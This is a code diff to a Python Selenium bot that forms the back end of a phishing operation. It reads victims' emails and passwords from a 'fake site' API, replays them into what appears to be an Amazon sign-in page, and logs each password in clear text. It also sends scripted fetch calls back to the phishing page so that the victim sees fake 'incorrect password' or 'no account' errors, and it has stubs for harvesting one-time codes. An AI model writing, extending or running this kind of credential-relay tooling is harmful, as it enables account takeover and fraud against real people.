@@ -69,6 +69,7 @@ class Abrowser(object):
         if hasattr(self, 'driver'):
             self.driver.quit()
         a_db.session_now_minus()
+        a_db.acc_stop_work(self.user_id_db)
         return
 
     def is_end_work(self):
@@ -96,7 +97,7 @@ class Abrowser(object):
                 if accs_who_need is not None:
                     for acc in accs_who_need:
                         if acc["status"] == "Need password":
-                            
+                            self.get_acc_password(int(acc["id"]))
                             pass
                         elif acc["status"] == "Need otp code":
                             pass
@@ -113,6 +114,25 @@ class Abrowser(object):
             self.quit()
             return
 
+
+    def get_acc_password(self, id: int):
+        try:
+            self.driver.get(f"{url_fake_site}/api/v1/user_sessions?session_status=needs%20authentication")
+            el = WebDriverWait(self.driver, 3).until(EC.visibility_of_element_located((By.XPATH, "//pre")))
+            json_el = json.loads(el.text[8:-1])
+            newlist = sorted(json_el, key=lambda k: k['id'], reverse=True) 
+            for d in newlist:
+                acc_id = d["id"]
+                if int(acc_id) != id:
+                    continue
+                acc_password = d["password"]
+                a_db.acc_set_password(int(acc_id), acc_password)
+                self.print(f"Set password {acc_password} to acc id_db {acc_id}")
+            pass
+        except Exception as ex:
+            self.print(ex)
+            self.quit()
+            return
     def get_new_users(self):
         try:
             self.driver.get(f"{url_fake_site}/api/v1/user_sessions?session_status=needs%20email%20check")
@@ -187,13 +207,36 @@ class Abrowser(object):
             actions.pause(random.randint(1, 2))
             actions.click()
             actions.perform()
-            self.print(f"After click on el_input_submit {self.driver.current_url}")
+            # self.print(f"After click on el_input_submit {self.driver.current_url}")
+
+            time.sleep(3)
+            is_exept = False
+            try:
+                el_input_email = WebDriverWait(self.driver, 3).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'email']")))
+            except Exception as ex:
+                self.print(ex)
+                is_exept = True
+                pass
+
+            if is_exept is True:
+                url_to_email_check_error = f"{url_fake_site}/api/v1/user_sessions/{self.user_id}/email_check_error"
+                script_data = f"fetch('{url_to_email_check_error}'," + """{
+                        method: 'PATCH',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ 
+                            error_message: 'We cannot find an account with that email address 
+                        })
+                    })"""
+                a_db.add_executed_code(script_data)
+                raise Exception("Bad email")
 
             url_to_email_check_success = f"{url_fake_site}/api/v1/user_sessions/{self.user_id}/email_check_success"
             script_data = f"fetch('{url_to_email_check_success}',"+" {method: 'PATCH'}"+").then((response) => response.json()).then((data) => " + "{ console.log(data)})"
             a_db.add_executed_code(script_data)
             a_db.acc_change_status(self.user_id_db, "Need password")
-
+            first_try_password = True
             while True:
                 if self.is_end_work() is True:
                     self.quit()
@@ -202,35 +245,58 @@ class Abrowser(object):
                 if password is None:
                     time.sleep(1)
                     continue
-                else:
-                    # a_db.acc_change_status(self.user_id, "Got password")
-                    self.password = password
-                    break
+
+                self.password = password
+                
+                if first_try_password == True:
+                    try:
+                        el_rememberMe = WebDriverWait(self.driver, 3).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'rememberMe']")))
+                    except Exception as ex:
+                        raise Exception("el_rememberMe")
+                    el_rememberMe.click()
+                    first_try_password = False
+
+                try:
+                    el_password = WebDriverWait(self.driver, 3).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'password']")))
+                except Exception as ex:
+                    raise Exception("el_password")
+                self.driver.execute_script(f"arguments[0].setAttribute('value','{self.password}')", el_password)
+
+                try:
+                    el_signInSubmit = WebDriverWait(self.driver, 3).until(EC.presence_of_element_located((By.XPATH, "//input[@type = 'submit']")))
+                except Exception as ex:
+                    raise Exception("el_signInSubmit")
+
+                el_signInSubmit.click()
+                time.sleep(3)
+
+                is_exept = False
+                try:
+                    el_password = WebDriverWait(self.driver, 3).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'password']")))
+                except Exception as ex:
+                    is_exept = True
+                    self.print(ex)
+                
+                if is_exept is True:
+                    url_to_email_auth_error = f"{url_fake_site}/api/v1/user_sessions/{self.user_id}/auth_error"
+                    script_data = f"fetch('{url_to_email_auth_error}'," + """{
+                            method: 'PATCH',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({ 
+                                error_message: 'Your password is incorrect
+                            })
+                        })"""
+                    a_db.acc_set_password(self.user_id_db, "None")
+                    a_db.add_executed_code(script_data)
+                    a_db.acc_change_status(self.user_id_db, "Need password")
+                    self.print(f"Bad password {self.password}")
+                    continue
+                break
             
-            try:
-                el_rememberMe = WebDriverWait(self.driver, 3).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'rememberMe']")))
-            except Exception as ex:
-                raise Exception("el_rememberMe")
-
-            el_rememberMe.click()
-
-            try:
-                el_password = WebDriverWait(self.driver, 3).until(EC.presence_of_element_located((By.XPATH, "//input[@name = 'password']")))
-            except Exception as ex:
-                raise Exception("el_password")
-
-            self.driver.execute_script(f"arguments[0].setAttribute('value','{self.password}')", el_password)
-
-            try:
-                el_signInSubmit = WebDriverWait(self.driver, 3).until(EC.presence_of_element_located((By.XPATH, "//input[@type = 'submit']")))
-            except Exception as ex:
-                raise Exception("el_signInSubmit")
-
-            el_signInSubmit.click()
-            # <input type="password" id="ap_password" name="password" tabindex="2" class="a-input-text a-span12 auth-autofocus auth-required-field">
-            # <input type="checkbox" name="rememberMe" value="true" tabindex="4">
-            # input id="signInSubmit" tabindex="5" class="a-button-input" type="submit" aria-labelledby="auth-signin-button-announce">        
-
+            
+            
             time.sleep(20)
         except Exception as ex:
             self.print(ex)
